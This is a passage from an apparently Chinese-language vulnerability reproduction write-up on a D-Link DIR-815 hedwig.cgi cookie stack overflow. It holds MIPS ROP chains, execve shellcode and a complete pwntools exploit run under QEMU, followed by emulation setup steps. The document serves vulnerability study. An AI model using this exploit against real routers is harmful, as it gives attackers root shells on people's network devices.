\</span></span><br><span class="line"><span class="string">    -E HTTP_COOKIE=\&quot;&quot;&quot;&quot;</span> + payload + <span class="string">b&quot;&quot;&quot;\&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_URI=&quot;2333&quot; \</span></span><br><span class="line"><span class="string">    ./htdocs/cgibin</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, shell = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">io.send(post_content)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>payload的编写逻辑：</p>
+<table>
+<thead>
+<tr>
+<th>覆盖位置</th>
+<th>写入值</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>$s0</td>
+<td>system - 1</td>
+<td>system 地址减 1</td>
+</tr>
+<tr>
+<td>$s1</td>
+<td>libc + 0x159F4</td>
+<td>gadget：move $t9, $s0; jalr $t9</td>
+</tr>
+<tr>
+<td>$s2</td>
+<td>aaaa（无用）</td>
+<td>占位</td>
+</tr>
+<tr>
+<td>$s3</td>
+<td>bin_sh</td>
+<td>“&#x2F;bin&#x2F;sh”字符串指针</td>
+</tr>
+<tr>
+<td>$s4, $s5</td>
+<td>aaaa（无用）</td>
+<td>占位</td>
+</tr>
+<tr>
+<td>$s6</td>
+<td>libc + 0x32A98</td>
+<td>gadget：addiu $s0, 1; …; jalr $s1</td>
+</tr>
+<tr>
+<td>$s7, $fp</td>
+<td>aaaa（无用）</td>
+<td>占位</td>
+</tr>
+<tr>
+<td>$ra</td>
+<td>libc + 0x13F8C</td>
+<td>gadget：move $a0, $s3; …; jalr $s6</td>
+</tr>
+</tbody></table>
+<p>ROP 链执行流程:</p>
+<p>函数返回时，所有寄存器从栈上恢复，然后跳转到 $ra。执行顺序如下：</p>
+<p>第一步 → $ra（gadget @ 0x13F8C）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">move $a0, $s3    # $a0 = $s3 = &quot;/bin/sh&quot; 地址（设置第一个参数）</span><br><span class="line">jalr $s6         # 跳转到 $s6</span><br></pre></td></tr></table></figure>
+
+<p>第二步 → $s6（gadget @ 0x32A98）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">addiu $s0, 1     # $s0 = (system-1) + 1 = system 的正确地址</span><br><span class="line">...</span><br><span class="line">jalr $s1         # 跳转到 $s1</span><br></pre></td></tr></table></figure>
+
+<p>第三步 → $s1（gadget @ 0x159F4）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">move $t9, $s0    # $t9 = $s0 = system()</span><br><span class="line">jalr $t9         # 调用 system(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>此时$a0已经指向 “&#x2F;bin&#x2F;sh”，$t9指向 system，于是成功执行 system(“&#x2F;bin&#x2F;sh”)，拿到 shell。</p>
+<h4 id="2-通过-shellcode-来-getshell（由于-MIPS-架构是无法开启-NX-保护的，因此可以使用-ret2shellcode，但需要注意-shellcode-中不能存在-b’-x00’-等字符防止导致-sprintf-被截断）"><a href="#2-通过-shellcode-来-getshell（由于-MIPS-架构是无法开启-NX-保护的，因此可以使用-ret2shellcode，但需要注意-shellcode-中不能存在-b’-x00’-等字符防止导致-sprintf-被截断）" class="headerlink" title="2. 通过 shellcode 来 getshell（由于 MIPS 架构是无法开启 NX 保护的，因此可以使用 ret2shellcode，但需要注意 shellcode 中不能存在 b’\x00’ 等字符防止导致 sprintf 被截断）"></a>2. 通过 shellcode 来 getshell（由于 MIPS 架构是无法开启 NX 保护的，因此可以使用 ret2shellcode，但需要注意 shellcode 中不能存在 b’\x00’ 等字符防止导致 sprintf 被截断）</h4><p>MIPS 的函数返回用 jr $ra，但 MIPS 有分支延迟槽，而且不能直接跳到栈上执行（需要先把栈地址放到寄存器里再跳转）。所以需要多个 gadget 串联。</p>
+<h5 id="第一段-ROP：调用-sleep-1-刷新缓存"><a href="#第一段-ROP：调用-sleep-1-刷新缓存" class="headerlink" title="第一段 ROP：调用 sleep(1) 刷新缓存"></a>第一段 ROP：调用 sleep(1) 刷新缓存</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload += p32(libc_base + <span class="number">0x436D0</span>)  <span class="comment"># s1 → gadget: move $t9, $s3; ... jalr $t9</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>                     <span class="comment"># s2（占位）</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x56BD0</span>)  <span class="comment"># s3 → sleep 函数地址</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">5</span>)                <span class="comment"># s4–s7 + padding</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x57E50</span>)  <span class="comment"># ra → gadget: li $a0, 1; ... jalr $s1</span></span><br></pre></td></tr></table></figure>
+
+<p>执行流程：</p>
+<ol>
+<li>函数返回时跳到 $ra（0x57E50）：li $a0, 1 然后 jalr $s1</li>
+<li>跳到 $s1（0x436D0）：move $t9, $s3 然后 jalr $t9</li>
+<li>跳到 $s3（0x56BD0）：即 sleep(1)</li>
+</ol>
+<p>为什么要调用 sleep？ MIPS 使用指令缓存（I-cache）和数据缓存（D-cache）。栈上写入的 shellcode 在数据缓存中，指令缓存可能还是旧数据。调用 sleep 会触发内核上下文切换，使 cache 刷新&#x2F;同步，确保之后跳转到栈上的 shellcode 时执行的是正确的指令。</p>
+<h5 id="第二段-ROP：跳转到栈上-shellcode"><a href="#第二段-ROP：跳转到栈上-shellcode" class="headerlink" title="第二段 ROP：跳转到栈上 shellcode"></a>第二段 ROP：跳转到栈上 shellcode</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>                  <span class="comment"># sleep 返回后的栈帧填充</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">4</span>)                <span class="comment"># s0–s3</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x37E6C</span>)  <span class="comment"># s4 → gadget: move $t9, $a1; jalr $t9</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x3B974</span>)  <span class="comment"># ra → gadget: addiu $a1, $sp, 0x18; jalr $s4</span></span><br></pre></td></tr></table></figure>
+
+<p>执行流程：</p>
+<ol>
+<li>sleep 返回后跳到 $ra（0x3B974）：addiu $a1, $sp, 0x18（把 $sp+0x18 的地址放入 $a1，这正是 shellcode 在栈上的位置），然后 jalr $s4</li>
+<li>跳到 $s4（0x37E6C）：move $t9, $a1; jalr $t9</li>
+<li>最终跳到栈上的 shellcode 执行</li>
+</ol>
+<hr>
+<h5 id="四、Shellcode：执行-bin-sh"><a href="#四、Shellcode：执行-bin-sh" class="headerlink" title="四、Shellcode：执行 &#x2F;bin&#x2F;sh"></a>四、Shellcode：执行 &#x2F;bin&#x2F;sh</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>    <span class="comment"># 对齐到 $sp+0x18 的位置</span></span><br><span class="line">payload += shellcode</span><br></pre></td></tr></table></figure>
+
+<p>Shellcode 的汇编逻辑：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">slti $a2, $zero, -1       # $a2 = 0（envp = NULL）</span><br><span class="line">li $t7, 0x69622f2f        # &quot;//bi&quot;</span><br><span class="line">sw $t7, -12($sp)          # 写入栈</span><br><span class="line">li $t6, 0x68732f6e        # &quot;n/sh&quot;</span><br><span class="line">sw $t6, -8($sp)           # 拼出 &quot;//bin/sh\x00&quot;</span><br><span class="line">sw $zero, -4($sp)         # 字符串结尾 NULL</span><br><span class="line">la $a0, -12($sp)          # $a0 = 指向 &quot;//bin/sh&quot; 的指针（argv[0]）</span><br><span class="line">slti $a1, $zero, -1       # $a1 = 0（argv = NULL）</span><br><span class="line">li $v0, 4011              # 系统调用号 4011 = execve</span><br><span class="line">syscall 0x40404           # 触发系统调用</span><br></pre></td></tr></table></figure>
+
+<h5 id="syscall-后面的数字是一个20-位的-code-字段，对比机器码"><a href="#syscall-后面的数字是一个20-位的-code-字段，对比机器码" class="headerlink" title="syscall 后面的数字是一个20 位的 code 字段，对比机器码"></a>syscall 后面的数字是一个20 位的 code 字段，对比机器码</h5><p>MIPS syscall 指令的编码格式是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000000 [20-bit code] 001100</span><br></pre></td></tr></table></figure>
+
+<p>如果用 syscall 0：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">000000 00000000000000000000 001100</span><br><span class="line">= 0x00 0x00 0x00 0x0C   ← 含有三个 \x00</span><br></pre></td></tr></table></figure>
+
+<p>如果用 syscall 0x40404：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">000000 01000000010000000100 001100</span><br><span class="line">= 0x01 0x01 0x04 0x0C   ← 没有 \x00</span><br></pre></td></tr></table></figure>
+
+<p>EXP:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;mips&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = <span class="number">0x3ff38000</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3cd</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x436D0</span>) <span class="comment"># s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x56BD0</span>) <span class="comment"># s3  sleep</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">5</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x57E50</span>) <span class="comment"># ra  li $a0, 1 (=&gt; jalr $s1)</span></span><br><span class="line"> </span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x37E6C</span>) <span class="comment"># s4  move  $t9, $a1 (=&gt; jalr $t9)</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x3B974</span>) <span class="comment"># ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span></span><br><span class="line"> </span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    slti $a2, $zero, -1</span></span><br><span class="line"><span class="string">    li $t7, 0x69622f2f</span></span><br><span class="line"><span class="string">    sw $t7, -12($sp)</span></span><br><span class="line"><span class="string">    li $t6, 0x68732f6e</span></span><br><span class="line"><span class="string">    sw $t6, -8($sp)</span></span><br><span class="line"><span class="string">    sw $zero, -4($sp)</span></span><br><span class="line"><span class="string">    la $a0, -12($sp)</span></span><br><span class="line"><span class="string">    slti $a1, $zero, -1</span></span><br><span class="line"><span class="string">    li $v0, 4011</span></span><br><span class="line"><span class="string">    syscall 0x40404</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += shellcode</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&quot;uid=&quot;</span> + payload</span><br><span class="line">post_content = <span class="string">&quot;icyice=pwner&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    qemu-mipsel-static -L ./ \</span></span><br><span class="line"><span class="string">    -0 &quot;hedwig.cgi&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_METHOD=&quot;POST&quot; \</span></span><br><span class="line"><span class="string">    -E CONTENT_LENGTH=12 \</span></span><br><span class="line"><span class="string">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span></span><br><span class="line"><span class="string">    -E HTTP_COOKIE=\&quot;&quot;&quot;&quot;</span> + payload + <span class="string">b&quot;&quot;&quot;\&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_URI=&quot;2333&quot; \</span></span><br><span class="line"><span class="string">    ./htdocs/cgibin</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, shell = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">io.send(post_content)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="QEMU-系统级复现"><a href="#QEMU-系统级复现" class="headerlink" title="QEMU 系统级复现"></a>QEMU 系统级复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>通过 busybox 程序查看路由器架构：</p>
+<p><img src="/./../images/image-20260414221029092.png"></p>
+<p>首先下载 MIPS32 架构的 QEMU 内核和镜像文件，我这里是通过wegt下载的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://people.debian.org/~aurel32/qemu/mipsel/debian_squeeze_mipsel_standard.qcow2 https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：</p>
+<p>MIPS32 架构有 Debian Squeeze 和 Debian Wheezy 两种镜像：</p>
+<ul>
+<li>Squeeze 中的软件包和库通常比 Wheezy 中的旧，因此 Squeeze 适合运行需要特定旧版本库或依赖的应用程序</li>
+<li>Wheezy 适合需要更好的性能、更好的硬件支持或更新的软件包的场景</li>
+</ul>
+<p>内核镜像文件 vmlinux 有 4kc 和 5kc 两种版本：4kc 为 32 位，5kc 为 64 位</p>
+<p>另外，与 ARM 架构不同，MIPS32 的仿真没有 RAM 磁盘映像文件 initrd.img</p>
+</blockquote>
+<p>使用 qemu-system-mipsel 来启动 QEMU 虚拟机，命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> qemu-system-mipsel \</span><br><span class="line">  -M malta \</span><br><span class="line">  -kernel ./vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">  -hda ./debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">  -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> \</span><br><span class="line">  -net nic \</span><br><span class="line">  -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">  -nographic</span><br></pre></td></tr></table></figure>
+
+<p>启动成功后，账号和密码都是 root：</p>
+<p><img src="/./../images/image-20260414221037914.png"></p>
+<p>如果报错:sudo: qemu-system-mipsel: command not found</p>
+<p>安装 QEMU 对 MIPS 架构的支持。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install qemu-system-mips</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/image-20260414221044258.png"></p>
+<p>然后配置虚拟网卡，在kali里创建一个 net.sh 脚本，并写入如下内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">sudo</span> brctl addbr br0                   <span class="comment"># 添加一座名为 br0 的网桥</span></span><br><span class="line"><span class="built_in">sudo</span> ifconfig br0 192.168.2.3/24 up    <span class="comment"># 启用 br0 接口</span></span><br><span class="line"><span class="built_in">sudo</span> tunctl -t tap0 -u root            <span class="comment"># 创建一个只许 root 访问的 tap0 接口</span></span><br><span class="line"><span class="built_in">sudo</span> ifconfig tap0 192.168.2.1/24 up   <span class="comment"># 启用 tap0 接口</span></span><br><span class="line"><span class="built_in">sudo</span> brctl addif br0 tap0              <span class="comment"># 在虚拟网桥中增加一个 tap0 接口</span></span><br></pre></td></tr></table></figure>
+
+<p>赋予执行权限并运行该脚本：（每次重启 kali 后都需要重新配置一次）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> +x net.sh</span><br><span class="line">./net.sh</span><br></pre></td></tr></table></figure>
+
+<p>如果报错TUNSETIFF: Device or resource busy：<br><img src="/./../images/image-20260414221052672.png"></p>
+<p>这是最常见的原因。之前启动的 QEMU 虚拟机可能还在后台运行，持有 tap0 的文件描述符：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep qemu</span><br></pre></td></tr></table></figure>
+
+<p>如果发现有残留的 QEMU 进程，先 kill 掉：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">kill</span> -9 &lt;PID&gt;</span><br></pre></td></tr></table></figure>
+
+<p>或者直接杀掉所有 QEMU 进程：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> killall -9 qemu-system-mipsel</span><br></pre></td></tr></table></figure>
+
+<p>杀掉进程后再清理网络接口</p>
+<p>按顺序执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ip <span class="built_in">link</span> <span class="built_in">set</span> tap0 down</span><br><span class="line"><span class="built_in">sudo</span> brctl delif br0 tap0       <span class="comment"># 先从网桥移除</span></span><br><span class="line"><span class="built_in">sudo</span> ip tuntap del tap0 mode tap</span><br><span class="line"><span class="built_in">sudo</span> ifconfig br0 down</span><br><span class="line"><span class="built_in">sudo</span> brctl delbr br0</span><br></pre></td></tr></table></figure>
+
+<p>确认清理干净</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip <span class="built_in">link</span> show | grep -E <span class="string">&quot;tap|br0&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果没有输出，说明已经清理成功。</p>
+<p>然后重新运行 net.sh</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./net.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/image-20260414221059434.png"></p>
+<p>然后这里重启 QEMU 虚拟机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> qemu-system-mipsel \</span><br><span class="line">  -M malta \</span><br><span class="line">  -kernel ./vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">  -hda ./debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">  -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> \</span><br><span class="line">  -net nic \</span><br><span class="line">  -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">  -nographic</span><br></pre></td></tr></table></figure>
+
+<p>在 QEMU 虚拟机中设置 ip 地址，注意与 tap0 在同一网段：（每次重启 QEMU 虚拟机后都需要重新配置一次）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root@debian-mipsel) ifconfig eth0 192.168.2.2/24 up</span><br></pre></td></tr></table></figure>
+
+<p>配置后 QEMU 虚拟机的 ip 地址为 192.168.2.2，测试一下能否与 Kali 的 192.168.2.1 相互 ping 通：</p>
+<p><img src="/./../images/image-20260414221105721.png"></p>
+<p>将文件系统打包并通过 scp 命令上传到 QEMU 虚拟机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf DIR-815A1_FW101SSB03_rootfs.tar.gz squashfs-root</span><br><span class="line"><span class="built_in">sudo</span> scp DIR-815A1_FW101SSB03_rootfs.tar.gz root@192.168.2.2:~/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/image-20260414221111787.png"></p>
+<p>PS:由于之前用户级复现都是在~&#x2F;…&#x2F;IOT&#x2F;CNVD-2013-11625&#x2F;_DIR-815A1_FW101SSB03.bin.extracted&#x2F;squashfs-root下进行的，所以这里打包文件系统的时候，需要注意把我们自己产生的文件移一下qwq，别一起打包了</p>
+<p>如果 scp 命令报错：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Unable to negotiate with 192.168.2.2 port 22: no matching host key <span class="built_in">type</span> found. Their offer: ssh-rsa,ssh-dss</span><br><span class="line">scp: Connection closed</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这表示 SSH 客户端和服务器之间没有匹配的主机密钥类型，通常是因为服务器只支持旧的 ssh-rsa 和 ssh-dss 密钥类型，而 SSH 客户端配置不再接受这些类型的密钥</p>
+</blockquote>
+<p>改用如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> scp -o HostKeyAlgorithms=+ssh-rsa DIR-815A1_FW101SSB03_rootfs.tar.gz root@192.168.2.2:~/</span><br></pre></td></tr></table></figure>
+
+<p>结果接着报错：</p>
+<p><img src="/./../images/image-20260414221120129.png"></p>
+<p>再继续使用如下命令，删除旧 key ：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ssh-keygen -R 192.168.2.2</span><br></pre></td></tr></table></figure>
+
+<p>删除旧 key 后，重新上传：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> scp -o HostKeyAlgorithms=+ssh-rsa DIR-815A1_FW101SSB03_rootfs.tar.gz root@192.168.2.2:~/</span><br></pre></td></tr></table></figure>
+
+<p>在 QEMU 虚拟机中解压：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root@debian-mipsel) tar -xzvf DIR-815A1_FW101SSB03_rootfs.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>在路由器文件系统的根目录，新建一个 HTTP 服务的配置文件 http_conf：</p>
+<blockquote>
+<p>因为 QEMU 虚拟机中没有 vi 和 vim 等，但可以使用 nano，这里以 cat 作为示例，cat &gt; 命令使用 ctrl + D 保存并退出</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> squashfs-root</span><br><span class="line"><span class="built_in">cat</span> &gt; http_conf</span><br></pre></td></tr></table></figure>
+
+<p>写入如下内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">Umask 026</span><br><span class="line">PIDFile /var/run/httpd.pid</span><br><span class="line">LogGMT On   <span class="comment"># 开启 log</span></span><br><span class="line">ErrorLog /log   <span class="comment"># log 文件</span></span><br><span class="line"></span><br><span class="line">Tuning &#123;</span><br><span class="line">    NumConnections 15</span><br><span class="line">    BufSize 12288</span><br><span class="line">    InputBufSize 4096</span><br><span class="line">    ScriptBufSize 4096</span><br><span class="line">    NumHeaders 100</span><br><span class="line">    Timeout 60</span><br><span class="line">    ScriptTimeout 60</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Control &#123;</span><br><span class="line">    Types &#123;</span><br><span class="line">        text/html &#123; html htm &#125;</span><br><span class="line">        text/xml &#123; xml &#125;</span><br><span class="line">        text/plain &#123; txt &#125;</span><br><span class="line">        image/gif &#123; gif &#125;</span><br><span class="line">        image/jpeg &#123; jpg &#125;</span><br><span class="line">        text/css &#123; css &#125;</span><br><span class="line">        application/octet-stream &#123; * &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Specials &#123;</span><br><span class="line">        Dump &#123; /dump &#125;</span><br><span class="line">        CGI &#123; cgi &#125;</span><br><span class="line">        Imagemap &#123; map &#125;</span><br><span class="line">        Redirect &#123; url &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    External &#123;</span><br><span class="line">        /usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Server &#123;</span><br><span class="line">    ServerName <span class="string">&quot;Linux, HTTP/1.1, &quot;</span></span><br><span class="line">    ServerId <span class="string">&quot;1234&quot;</span></span><br><span class="line">    Family inet</span><br><span class="line">    Interface eth0         <span class="comment"># 网卡</span></span><br><span class="line">    Address 192.168.2.2    <span class="comment"># qemu 的 ip 地址</span></span><br><span class="line">    Port <span class="string">&quot;4321&quot;</span>            <span class="comment"># 对应 web 访问端口</span></span><br><span class="line">    Virtual &#123;</span><br><span class="line">        AnyHost</span><br><span class="line">        Control &#123;</span><br><span class="line">            Alias /</span><br><span class="line">            Location /htdocs/web</span><br><span class="line">            IndexNames &#123; index.php &#125;</span><br><span class="line">            External &#123;</span><br><span class="line">                /usr/sbin/phpcgi 